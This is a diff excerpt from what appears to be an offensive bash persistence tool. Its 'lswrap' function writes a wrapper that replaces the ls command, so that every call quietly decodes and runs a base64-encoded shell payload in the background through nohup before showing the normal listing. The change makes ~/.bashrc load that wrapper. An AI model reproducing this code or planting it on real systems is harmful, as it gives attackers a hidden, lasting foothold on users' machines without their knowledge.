@@ -92,7 +92,7 @@ function lswrap(){
 				shell=${payloads[0]}
 				encshell
 				echo -e "function ls(){ \n(echo \"${encode}\" | base64 -d | nohup bash > /dev/null 2>.1 &)\n /usr/bin/ls; rm .1; }" > $HOME/.ls
-				echo "source ~/.ls" >> .bashrc
+				echo "source ~/.ls" >> ~/.bashrc
 				echo -e "\nls wrapper added!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal\n"
 				read -p "Press enter to continue ";;
 		[Exitexit]* ) return 1;;
